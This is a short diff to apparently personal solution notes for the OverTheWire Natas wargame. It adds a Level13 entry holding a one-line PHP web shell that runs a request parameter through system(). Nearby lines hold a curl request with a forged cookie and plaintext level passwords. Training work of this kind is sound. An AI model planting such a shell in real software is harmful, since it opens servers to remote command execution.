@@ -40,5 +40,10 @@
 * curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -H "Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" -X GET "http://natas11.natas.labs.overthewire.org/"
 * EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
+#### Level13
+> <?php
+> > $s=$_REQUEST['simba']; system($s);
+> ?>
+* jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 
 
